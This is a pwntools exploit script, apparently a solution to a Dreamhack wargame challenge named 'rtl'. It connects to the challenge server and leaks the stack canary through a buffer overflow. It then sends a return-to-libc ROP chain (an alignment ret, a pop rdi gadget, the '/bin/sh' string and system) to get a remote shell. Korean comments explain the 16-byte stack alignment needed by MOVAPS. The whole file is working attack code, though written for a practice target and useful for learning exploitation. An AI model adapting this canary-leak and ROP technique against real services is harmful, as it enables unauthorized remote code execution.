from pwn import*
context.arch='amd64'
context.log_level = 'debug'

Host='host3.dreamhack.games'
Port=8291

elf = ELF('./rtl')
system = 0x4005d0
binsh = 0x400874
pop_rdi = 0x400853
ret = 0x400285
#system = elf.plt['system']

r = remote(Host, Port)

leak_canary = b'A'* (0x40 - 0x8)
leak_canary += b'B'

r.sendafter('Buf: ',leak_canary)
r.recvuntil(leak_canary)

canary = r.recvn(7)
canary = u64(b'\x00' + canary)

payload = ''
payload += b'A'*(0x40 - 0x8)
payload += p64(canary)
payload += b'B' * 0x8

# SYSTEM 함수 내에 MOVAPS 라는 INSTRUCTION 이 존재한다.
# 해당 INSTRUCTION 은 사용하는 값(OPERAND) 가 16byte 로 정렬 되어있어야 한다.
# 하지만 ret 을 빼게 되면 8byte 단위로 정렬 되어 있기 때문에 에러가 발생한다.
# ret 이 없으면 총 24byte 상태임
# ret 을 추가하게 되면 32byte 로 16byte 로 정렬이 됨.
# ret 은 pop rip; jmp rip 역할을 한다. 
# 이 때 스택에서 rip 로 주소를 꺼내오는 과정에서 rsp 가 8증가하게 되고 
# rsp 값이 0x10 단위로 정렬되게 된다. 
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

log.info('[+] canary : ' + hex(canary))
log.info('[+] system : ' + hex(system))
log.info('[+] /bin/sh : ' + hex(binsh))

pause()

r.sendafter("Buf: ", payload)
r.interactive()
